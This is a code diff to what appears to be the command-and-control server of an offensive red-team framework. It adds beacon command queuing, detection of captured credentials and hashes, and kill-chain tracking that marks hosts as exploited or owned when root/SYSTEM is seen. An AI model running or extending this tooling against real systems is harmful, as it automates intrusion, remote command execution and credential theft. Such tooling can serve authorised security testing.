@@ -1778,17 +1778,6 @@ def read_and_forward_pty_output():
             except Exception:
                 logger.error("Error leyendo salida:")
 
-def read_and_forward_pty_output_c2():
-    max_read_bytes = 1024 * 20
-    while True:
-        socketio.sleep(0.01)
-        if app.config["fd"]:
-            timeout_sec = 0
-            (data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
-            if data_ready:
-                output = os.read(app.config["fd"], max_read_bytes).decode(errors="replace")
-                socketio.emit('output', {'data': output}, namespace='/terminal')
-
 def get_discovered_hosts():
     """
     Reads the sessions/hostsdiscovery.txt file and returns a list of discovered hosts.
@@ -2940,7 +2929,37 @@ def receive_result(client_id):
             # ── Conditional Hooks: fire operator-defined rules ──────────────────
             try:
                 _was_new = _was_new_beacon
-                _primary_ip = str(ips).split(",")[0].strip().strip("[]'\"") if ips else str(hostname)
+
+                def _extract_first_ip(raw: str) -> str:
+                    """Extract the first valid IPv4 address from a comma-separated string."""
+                    import ipaddress as _ipm
+                    for _candidate in str(raw).split(","):
+                        _clean = _candidate.strip().strip("[]'\" ")
+                        try:
+                            _ipm.IPv4Address(_clean)
+                            return _clean
+                        except Exception:
+                            continue
+                    return ""
+
+                def _is_valid_credential(value: str) -> bool:
+                    """Check if a string looks like a captured credential."""
+                    _v = str(value).strip()
+                    if not _v:
+                        return False
+                    if len(_v) < 6:
+                        return False
+                    _has_user_pass = ":" in _v and 2 <= len(_v.split(":", 1)[0]) <= 128
+                    _has_ntlm = "$" in _v and len(_v) >= 32
+                    _has_hash = "$" in _v and "$:" in _v
+                    _is_multiline = "\n" in _v and _has_user_pass
+                    _is_path_only = _v.startswith("/") or _v.startswith("\\") or _v.startswith("C:")
+                    if _is_path_only and not _has_user_pass:
+                        return False
+                    return _has_user_pass or _has_ntlm or _has_hash or _is_multiline
+
+                _raw_ips = str(ips) if ips else ""
+                _primary_ip = _extract_first_ip(_raw_ips) or str(hostname)
                 from modules.conditional_hooks import get_hook_engine as _get_hooks
                 _hook_engine = _get_hooks()
                 _hook_engine.set_placeholders({
@@ -2949,22 +2968,90 @@ def receive_result(client_id):
                     "domain": str(getattr(config, 'domain', '')),
                 })
 
+                def _normalise_platform(raw_platform: str) -> str:
+                    _r = raw_platform.lower()
+                    if "linux" in _r:
+                        return "linux"
+                    if "windows" in _r or "win" in _r:
+                        return "windows"
+                    return _r
+
+                if "run_command" not in _hook_engine._action_handlers:
+                    _allowed_dir = ALLOWED_DIRECTORY
+
+                    def _queue_beacon_cmd(action: dict, ctx: dict) -> bool | None:
+                        _cid = str(ctx.get("client_id", ""))
+                        _cmd = str(action.get("command", ""))
+                        if not _cid or not _cmd:
+                            return None
+                        _sanitized = "".join(c for c in _cid if c.isalnum() or c in "-_")
+                        _queue_path = os.path.join(_allowed_dir, f"cmd_{_sanitized}.json")
+                        try:
+                            _cmds: list = []
+                            if os.path.isfile(_queue_path):
+                                with open(_queue_path) as _qf:
+                                    _cmds = json.load(_qf)
+                            _cmds.append(_cmd)
+                            with open(_queue_path, "w") as _qf:
+                                json.dump(_cmds, _qf)
+                            logging.info("[hooks] Queued beacon cmd for %s: %s", _cid, _cmd[:80])
+                            return True
+                        except Exception as _exc:
+                            logging.warning("[hooks] Beacon queue failed: %s", _exc)
+                            return None
+
+                    _hook_engine.register_action_handler("run_command", _queue_beacon_cmd)
+                    _hook_engine.register_action_handler("run_scan_command", _queue_beacon_cmd)
+
                 _hctx = {
                     "client_id": str(sanitized_client_id),
                     "ip": _primary_ip,
                     "hostname": str(hostname),
                     "user": str(user),
-                    "platform": str(client),
+                    "platform": _normalise_platform(str(client)),
                     "command": str(command),
                     "output": str(output)[:500],
                 }
 
                 if _was_new:
                     _hook_engine.fire("beacon_connected", _hctx)
+                    try:
+                        from modules.world_model import HostState as _HS, get_world_model as _get_wm
+                        _wm = _get_wm()
+                        _wm.advance_host(_primary_ip, _HS.EXPLOITED)
+                        _wm.add_note(_primary_ip, f"Foothold: {str(user)} via {str(client)}")
+                        logging.info("[world_model] Advanced %s to EXPLOITED (foothold)", _primary_ip)
+                        from modules.killchain import KillChain as _KC
+                        _KC.advance_phase("exploit")
+                        logging.info("[killchain] Phase advanced to exploit via beacon %s", sanitized_client_id)
+                    except Exception as _wme:
+                        logging.debug("[world_model] advance failed: %s", _wme)
 
                 _hook_engine.fire("command_executed", _hctx)
 
-                if result_pwd:
+                try:
+                    _out_lower = str(output).lower()
+                    _owns = (
+                        str(user).lower() == "root"
+                        or "uid=0(root)" in _out_lower
+                        or ("uid=0(" in _out_lower and "root" in _out_lower)
+                        or "nt authority\\system" in _out_lower
+                        or str(user).lower() == "nt authority\\system"
+                    )
+                    if _owns:
+                        from modules.world_model import HostState as _HS2, get_world_model as _get_wm2
+                        _wm2 = _get_wm2()
+                        _wm2.advance_host(_primary_ip, _HS2.OWNED)
+                        _wm2.add_note(_primary_ip, "Privilege escalation successful: root/System obtained")
+                        from modules.killchain import KillChain as _KC2
+                        _KC2.advance_phase("privesc")
+                        logging.info("[killchain] Phase advanced to privesc via beacon %s (root/system)", sanitized_client_id)
+                        _hook_engine.fire("privilege_escalated", _hctx)
+                        _hook_engine.fire("host_owned", _hctx)
+                except Exception:
+                    pass
+
+                if result_pwd and _is_valid_credential(str(result_pwd)):
                     _hook_engine.fire("credential_captured", _hctx)
                     try:
                         from modules.credential_reuse import get_credential_reuse_engine as _get_cre
@@ -3009,7 +3096,7 @@ def receive_result(client_id):
                             _sys.path.insert(0, _mods)
 
                         # Determine primary IP
-                        primary_ip = _ips.split(",")[0].strip().strip("[]'\"")
+                        primary_ip = _extract_first_ip(_ips)
                         if not primary_ip:
                             primary_ip = _host
 
